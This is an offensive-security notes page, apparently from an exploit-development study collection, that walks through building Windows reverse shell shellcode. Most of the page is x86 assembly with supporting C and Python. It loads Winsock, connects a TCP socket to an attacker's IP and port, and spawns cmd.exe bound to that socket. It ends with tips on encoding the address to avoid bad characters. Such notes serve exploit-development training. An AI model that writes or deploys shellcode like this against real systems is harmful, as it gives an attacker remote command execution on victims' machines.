---
tags:
  - Advanced
  - Binary_Exploitation
  - Custom_Tools
  - Debugging
  - Execution
  - Exploitation
  - Post_Exploitation
  - Windows
---

## Windows Reverse Shell Shellcode
resources: [Winsock Reference](https://learn.microsoft.com/en-us/windows/win32/winsock/winsock-reference)

> Build custom reverse shell shellcode using Windows Socket API.

### Reverse Shell Overview [Knowledge]
> [!info] Steps required for a Windows reverse shell:
> 1. Load **ws2_32.dll** (Winsock library)
> 2. Call **WSAStartup** to initialize Winsock
> 3. Create socket with **WSASocketA**
> 4. Connect to attacker with **WSAConnect** or **connect**
> 5. Create **cmd.exe** process with socket as stdin/stdout/stderr
> 6. Optionally call **ExitProcess**

### Required Functions
> Functions to resolve from DLLs.

```text
kernel32.dll:
- LoadLibraryA (to load ws2_32.dll)
- CreateProcessA (to spawn cmd.exe)

ws2_32.dll:
- WSAStartup (initialize Winsock)
- WSASocketA (create socket)
- connect (connect to remote host)
```

### Load ws2_32.dll
> Use **LoadLibraryA** to load Winsock library.

```nasm
; Assume EBP = kernel32 base, function resolver at find_function
    push 0x00003233         ; "32\0\0"
    push 0x5f327377         ; "ws2_"
    push esp                ; Pointer to "ws2_32"
    call [ebp + LoadLibraryA_offset]
    mov esi, eax            ; ESI = ws2_32.dll base
```

### WSAStartup Call
> Initialize Winsock subsystem.

```c
// C prototype
int WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData);
```

```nasm
; WSAStartup(0x0202, &wsadata)
    sub esp, 0x190          ; Allocate WSADATA structure (400 bytes)
    push esp                ; lpWSAData
    push 0x0202             ; wVersionRequired (2.2)
    call [ebp + WSAStartup_offset]
```

### WSASocketA Call
> Create a TCP socket.

```c
// C prototype
SOCKET WSASocketA(int af, int type, int protocol,
                  LPWSAPROTOCOL_INFOA lpProtocolInfo,
                  GROUP g, DWORD dwFlags);
```

```nasm
; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
    xor eax, eax
    push eax                ; dwFlags = 0
    push eax                ; g = 0
    push eax                ; lpProtocolInfo = NULL
    push eax                ; protocol = 0 (default)
    inc eax
    push eax                ; type = SOCK_STREAM (1)
    inc eax
    push eax                ; af = AF_INET (2)
    call [ebp + WSASocketA_offset]
    mov edi, eax            ; EDI = socket handle
```

### Connect to Attacker
> Connect socket to attacker's listener.

```c
// C prototype
int connect(SOCKET s, const sockaddr *name, int namelen);

// sockaddr_in structure
struct sockaddr_in {
    short   sin_family;     // AF_INET (2)
    u_short sin_port;       // Port (network byte order)
    struct  in_addr sin_addr; // IP address
    char    sin_zero[8];    // Padding
};
```

```nasm
; Build sockaddr_in on stack
    push <AttackerIP>       ; sin_addr (e.g., 0x0100007f = 127.0.0.1)
    push word <AttackerPort>; sin_port (e.g., 0x5c11 = 4444 big-endian)
    push word 0x0002        ; sin_family = AF_INET

; connect(socket, &sockaddr, 16)
    mov esi, esp            ; ESI = pointer to sockaddr_in
    push 16                 ; namelen
    push esi                ; name
    push edi                ; socket
    call [ebp + connect_offset]
```

### CreateProcessA with Socket
> Spawn cmd.exe with socket handles for I/O redirection.

```c
// STARTUPINFO structure (relevant fields)
typedef struct _STARTUPINFOA {
    DWORD   cb;             // Size of structure
    // ... other fields ...
    DWORD   dwFlags;        // STARTF_USESTDHANDLES (0x100)
    WORD    wShowWindow;
    // ...
    HANDLE  hStdInput;      // Socket handle
    HANDLE  hStdOutput;     // Socket handle
    HANDLE  hStdError;      // Socket handle
} STARTUPINFOA;
```

```nasm
; Build STARTUPINFOA on stack
    xor eax, eax
    push edi                ; hStdError = socket
    push edi                ; hStdOutput = socket
    push edi                ; hStdInput = socket
    push eax                ; lpReserved2 = NULL
    push eax                ; cbReserved2 = 0
    push eax                ; wShowWindow = 0
    push 0x0100             ; dwFlags = STARTF_USESTDHANDLES
    ; ... push remaining fields (mostly zeros) ...
    push 68                 ; cb = sizeof(STARTUPINFOA)
    mov esi, esp            ; ESI = &STARTUPINFOA

; Build PROCESS_INFORMATION structure (16 bytes, receives output)
    sub esp, 16
    mov ecx, esp            ; ECX = &PROCESS_INFORMATION

; Build "cmd.exe" string
    push eax                ; NULL terminator
    push 0x6578652e         ; ".exe"
    push 0x646d63           ; "cmd" (may need adjustment for NULLs)
    mov ebx, esp            ; EBX = "cmd.exe"

; CreateProcessA(NULL, "cmd.exe", ...)
    push ecx                ; lpProcessInformation
    push esi                ; lpStartupInfo
    push eax                ; lpCurrentDirectory = NULL
    push eax                ; lpEnvironment = NULL
    push eax                ; dwCreationFlags = 0
    push 1                  ; bInheritHandles = TRUE
    push eax                ; lpThreadAttributes = NULL
    push eax                ; lpProcessAttributes = NULL
    push ebx                ; lpCommandLine = "cmd.exe"
    push eax                ; lpApplicationName = NULL
    call [ebp + CreateProcessA_offset]
```

### IP Address Encoding
> Convert IP address to DWORD format.

```python
import socket
import struct

ip = "<AttackerIP>"
port = <Port>

# IP to DWORD (little-endian)
ip_bytes = socket.inet_aton(ip)
ip_dword = struct.unpack("<I", ip_bytes)[0]
print(f"IP DWORD: {hex(ip_dword)}")

# Port to big-endian WORD
port_be = struct.pack(">H", port)
print(f"Port bytes: {port_be.hex()}")
```

### Avoiding Bad Characters in IP/Port
> [!warning] Handle bad characters in IP address or port:

```nasm
; If IP contains NULL (e.g., 192.168.1.0)
; Use XOR encoding:
mov eax, 0xfefefefe         ; Mask
xor eax, <EncodedIP>        ; Decode to get real IP
push eax
```

